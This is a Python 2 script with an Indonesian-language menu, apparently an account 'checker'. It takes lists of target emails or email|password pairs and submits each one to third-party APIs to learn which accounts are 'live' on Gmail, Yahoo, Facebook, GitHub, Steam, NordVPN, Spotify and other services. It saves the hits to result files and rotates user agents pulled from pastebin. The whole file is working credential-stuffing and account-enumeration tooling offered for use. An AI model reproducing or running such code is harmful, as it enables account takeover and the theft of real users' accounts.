#!/usr/bin/python
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
#KASIH BINTANG BRO :^
#KONTOL YG RIKOD _-
G0 = "\033[0;32m"
G1 = "\033[1;32m"
C0 = "\033[0;36m"
C1 = "\033[1;36m"
P0 = "\033[0;35m"
P1 = "\033[1;35m"
W0 = "\033[0;37m"
W1 = "\033[1;37m"
B0 = "\033[0;34m"
B1 = "\033[1;34m"
R0 = "\033[0;31m"
R1 = "\033[1;31m"
Y1 = "\033[1;33m"
Y0 = "\033[0;33m"

try:
	import requests as r
	from bs4 import BeautifulSoup as bs
	import subprocess as sp
	import random,os,time,datetime
except:
	os.system('pip2 install requests bs4;python2 ceker.py')

def yh():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_yaho.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://nabil.my.id/Tools/Checker-Tools/Yahoo-Checker/api.php',headers={'user-agent':'{acak}'},data={'email':x})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_yaho.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_yaho.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def gm():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_gmail.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://nabil.my.id/Tools/Checker-Tools/Gmail-Checker/api.php',headers={'user-agent':'{acak}'},data={'email':x})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_gmail.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_gmail.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def hot():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_hot.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://nabil.my.id/Tools/Checker-Tools/Hotmail-Checker/api.php',headers={'user-agent':'{acak}'},data={'email':x})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_hot.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_hot.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def fb():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_fb.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/Fb_Checker_Email.php',headers={'user-agent':'{acak}'},data={'email':x})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_fb.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_fb.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def fb2():
	logo()
	target=raw_input('\033[1;32m[\033[1;33m?\033[1;32m] \033[0;37mMasukkan email target : ')
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	a=r.post('https://nabil.my.id/Tools/Checker-Tools/Fb-Checker-UID-Email/api.php',headers={'user-agent':'{acak}'},data={'email':target}).json()
	if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
	print
	print '%s[%s>%s] %sEmail : %s'%(W1,G1,W1,W0,a['email'])
	print '%s[%s>%s] %sNama  : %s'%(W1,G1,W1,W0,a['nama'])
	print '%s[%s>%s] %sUid   : %s'%(W1,G1,W1,W0,a['uid'])
	print '%s[%s>%s] %sTahun : %s'%(W1,G1,W1,W0,a['tahun'])
	print
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def gh():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_github.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/github.php',headers={'user-agent':'{acak}'},data={'email':x})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_github.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_github.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def ml():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_ml.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/api.php',headers={'user-agent':'{acak}'},data={'empas':x,'delimiter':'|'})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_ml.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_ml.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def idm():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@emal.com|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_idhom.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/indihome.php',headers={'user-agent':'{acak}'},data={'empas':x,'delimiter':'|'})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_idhom.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_idhom.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def stm():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus username|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_steam.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/steam.php',headers={'user-agent':'{acak}'},data={'userpass':x,'delimiter':'|'})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_steam.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_steam.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def vpn():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_vpn.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://jogosuroboyo2407.com/sby/pages/pertanyaan/other/nordvpn/api.php',headers={'user-agent':'{acak}'},data={'empas':x,'delimiter':'|'})
		if 'HTML' in b.text:
			print 'Web di protek cloudflare :v\nCoba lagi nanti'
			exit()
		elif 'live' in b.text:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_vpn.txt","a+").write(x+"\n")
		else:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_vpn.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def spo():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_spotify.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://www.tools.w3llsquad.or.id/api/spotify/auth.php',headers={'user-agent':'{acak}'},data={'lista':x})
		c=bs(b.content,'html.parser').find('span', class_='text-danger')
		if 'Die' in c.text:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
		else:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_spotify.txt","a+").write(x+"\n")
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_spotify.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def bl():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_bukalapak.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://www.tools.w3llsquad.or.id/api/bukalapak/auth.php',headers={'user-agent':'{acak}'},data={'lista':x})
		c=bs(b.content,'html.parser').find('span', class_='text-danger')
		if 'Die' in c.text:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
		else:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_bukalapak.txt","a+").write(x+"\n")
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_bukalapak.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def phd():
	logo()
	agent = r.get('https://pastebin.com/raw/ng1tPrfZ').text.split('\n')
	acak = random.choice(agent)
	print '%s[%s!%s] %sIsi file.txt harus target@email.com|password'%(W1,R1,W1,W0)
	a=open(raw_input('\033[1;37m[\033[1;32m?\033[1;37m] \033[0;37mFile : ')).read().splitlines()
	print
	now = datetime.datetime.now()
	open("result/live_phd.txt","a+").write(str(now)+"\n")
	for x in a:
		b=r.post('https://www.tools.w3llsquad.or.id/api/phd/auth.php',headers={'user-agent':'{acak}'},data={'lista':x})
		c=bs(b.content,'html.parser').find('span', class_='text-danger')
		if 'Die' in c.text:
			print '   %s[%s DIEE %s] %s%s'%(W1,R1,W1,W0,x)
		else:
			print '   %s[%s LIVE %s] %s%s'%(W1,G1,W1,W0,x)
			open("result/live_phd.txt","a+").write(x+"\n")
	print
	print '%s[%s√%s] %sResult live tersimpan di result/live_phd.txt'%(W1,G1,W1,W0)
	raw_input('\033[1;37m[\033[1;31m×\033[1;37m] \033[0;37mTekan enter untuk back !')
	main()
def logo():
	os.system('clear')
	print '''%s
_________ .__                   __
\_   ___ \|  |__   ____   ____ |  | __ ___________  
/    \  \/|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \ 
\     \___|   Y  \  ___/\  \___|    <\  ___/|  | \/ 
 \______  /___|  /\___  >\___  >__|_  \\___  >__|    
        \/     \/     \/     \/     \/    \/
'''%(G1)

def menu():
	print '''%s[%s>%s] %sPowered : nabil.my.id & tools.w3llsquad.or.id
%s[%s>%s] %sAuthor D4RKSH4D0WS

   %s{%s01%s} %sYahoo Checker Valid
   %s{%s02%s} %sMicrosoft Checker Valid
   %s{%s03%s} %sGmail Checker Valid
   %s{%s04%s} %sFB Email Checker Valid
   %s{%s05%s} %sGithub Checker Valid
   %s{%s06%s} %sFB Checker Info from email
   %s{%s07%s} %sMoonton Account Checker
   %s{%s08%s} %sIndihome Account Checker
   %s{%s09%s} %sSteam Account Checker
   %s{%s10%s} %sNordVPN Account Checker
   %s{%s11%s} %sSpotify Account Checker
   %s{%s12%s} %sBukalapak Account Checker
   %s{%s13%s} %sPizza Hut Account Checker
   %s{%s69%s} %sReport (Whatsapp)
   %s{%s00%s} %sExit
'''%(G1,Y1,G1,W0,G1,Y1,G1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,G1,W1,W0,W1,R1,W1,W0)
def main():
	try:
		logo()
		menu()
		chc=raw_input('\033[1;32m[\033[1;33m?\033[1;32m] \033[0;37m@ImamSy > ')
		if chc == '':
			print
			print '%s[%s!%s] %sJangan kosong'%(W1,R1,W1,W0)
			time.sleep(0.8)
			main()
		elif chc == '1' or chc == '01':
			yh()
		elif chc == '2' or chc == '02':
			hot()
		elif chc == '3' or chc == '03':
			gm()
		elif chc == '4' or chc == '04':
			fb()
		elif chc == '5' or chc == '05':
			gh()
		elif chc == '6' or chc == '06':
			fb2()
		elif chc == '7' or chc == '07':
			ml()
		elif chc == '8' or chc == '08':
			idm()
		elif chc == '9' or chc == '09':
			stm()
		elif chc == '10':
			vpn()
		elif chc == '11':
			spo()
		elif chc == '12':
			bl()
		elif chc == '13':
			phd()
		elif chc == '69':
			print
			chat = raw_input('\033[1;32m[\033[1;33m#\033[1;32m] \033[0;37mIsi pesan mu : ')
			chat.replace(' ', '%20')
			sp.check_output(['am', 'start','https://api.whatsapp.com/send?phone=628996604524&text=Report : ' + chat + ''])
			exit()
		elif chc == '0' or chc == '00':
			print
			exit('%s[%s*%s] %sBye bro :*'%(W1,G1,W1,W0))
		else:
			print
			print '%s[%s!%s] %sPilih yang bener cok'%(W1,R1,W1,W0)
			time.sleep(0.8)
			main()
	except IOError:
		print
		print '%s[%s!%s] %sFile tidak ada'%(W1,R1,W1,W0)
		time.sleep(1)
		main()
	except r.exceptions.ConnectionError:
		exit("%s[%sx%s] %sTidak ada koneksi/web sedang down"%(W1,R1,W1,W0))

if __name__=='__main__':
	os.system('git pull;mkdir result')
	time.sleep(1)
	main()

